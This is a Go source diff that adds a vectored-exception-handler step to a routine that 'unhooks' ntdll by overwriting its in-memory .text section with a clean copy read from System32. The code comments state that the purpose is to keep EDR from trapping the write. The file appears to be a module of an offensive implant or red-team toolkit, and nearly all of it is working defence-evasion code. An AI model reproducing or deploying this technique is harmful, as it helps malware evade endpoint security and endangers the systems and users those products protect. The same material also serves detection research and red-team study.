@@ -10,15 +10,51 @@ import (
 )
 
 // VEH-based ntdll unhooking: restore original ntdll .text section from disk.
-// Uses a VEH handler to catch access violations while restoring ntdll pages.
+// Uses a VEH handler to catch access violations during the restore operation,
+// preventing EDR from trapping the write via page-guard or breakpoint hooks.
+
+var (
+	procAddVectoredExceptionHandler    = kernel32.NewProc("AddVectoredExceptionHandler")
+	procRemoveVectoredExceptionHandler = kernel32.NewProc("RemoveVectoredExceptionHandler")
+)
+
+// vehHandler is the VEH exception handler callback.
+// It catches STATUS_ACCESS_VIOLATION (0xC0000005) during the unhook process,
+// makes the target page writable via VirtualProtect, and signals retry.
+//
+//go:uintptrescapes
+func vehHandler(exceptionInfo uintptr) uintptr {
+	rec := (*struct {
+		code      uint32
+		flags     uint32
+		record    uintptr
+		address   uintptr
+		numParams uint32
+		params    [15]uintptr
+	})(unsafe.Pointer(exceptionInfo))
+	// EXCEPTION_ACCESS_VIOLATION
+	if rec.code != 0xC0000005 {
+		return 0 // continue searching
+	}
+	// Attempt to make the faulting page writable
+	var oldProtect uint32
+	addr := rec.params[1] // faulting address
+	procVirtualProtect.Call(addr&^0xFFF, 0x1000, 0x04, uintptr(unsafe.Pointer(&oldProtect)))
+	return 1 // EXCEPTION_CONTINUE_EXECUTION
+}
+
+// unhookNtdll restores ntdll .text section from disk, with VEH protection.
 func unhookNtdll() string {
-	k32 := syscall.NewLazyDLL("kernel32.dll")
-	getModuleHandle := k32.NewProc("GetModuleHandleW")
-	virtualProtect := k32.NewProc("VirtualProtect")
+	// Register VEH handler before touching ntdll
+	vehHandle, _, _ := procAddVectoredExceptionHandler.Call(1, uintptr(syscall.NewCallback(vehHandler)))
+	if vehHandle == 0 {
+		return "VEH Unhook: failed to register VEH handler"
+	}
+	defer procRemoveVectoredExceptionHandler.Call(vehHandle)
 
 	// Get ntdll base address
 	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
-	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
+	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(namePtr)))
 	if hMod == 0 {
 		return "VEH Unhook: ntdll.dll not loaded"
 	}
@@ -68,7 +104,7 @@ func unhookNtdll() string {
 	}
 
 	var oldProtect uint32
-	ret, _, _ := virtualProtect.Call(textAddr, uintptr(textSize), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
+	ret, _, _ := procVirtualProtect.Call(textAddr, uintptr(textSize), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
 	if ret == 0 {
 		return "VEH Unhook: VirtualProtect failed"
 	}
@@ -77,28 +113,25 @@ func unhookNtdll() string {
 		*(*byte)(unsafe.Pointer(textAddr + uintptr(i))) = origData[i]
 	}
 
-	_ = oldProtect
-	_ = virtualProtect
-
 	return fmt.Sprintf("VEH Unhook: ntdll .text section restored (%d bytes, VA=0x%x)", len(origData), textAddr)
 }
 
 func readNtdllFromDisk(section *imageSectionHeader) []byte {
-	// Open ntdll.dll from system32 and read the .text section
 	ntdllPath := "C:\\Windows\\System32\\ntdll.dll"
 	k32 := syscall.NewLazyDLL("kernel32.dll")
 	createFile := k32.NewProc("CreateFileW")
+	setFilePointer := k32.NewProc("SetFilePointer")
 	readFile := k32.NewProc("ReadFile")
 	closeHandle := k32.NewProc("CloseHandle")
 
 	pathPtr, _ := syscall.UTF16PtrFromString(ntdllPath)
 	hFile, _, _ := createFile.Call(
 		uintptr(unsafe.Pointer(pathPtr)),
-		0x80000000, // GENERIC_READ
-		1,           // FILE_SHARE_READ
+		0x80000000,
+		1,
 		0,
-		3,           // OPEN_EXISTING
-		0x80,        // FILE_ATTRIBUTE_NORMAL
+		3,
+		0x80,
 		0,
 	)
 	if hFile == 0 || hFile == ^uintptr(0) {
@@ -106,7 +139,9 @@ func readNtdllFromDisk(section *imageSectionHeader) []byte {
 	}
 	defer closeHandle.Call(hFile)
 
-	// Read the .text section from file offset
+	// Seek to .text section file offset before reading
+	setFilePointer.Call(hFile, uintptr(section.pointerToRawData), 0, 0)
+
 	buf := make([]byte, section.sizeOfRawData)
 	var read uint32
 
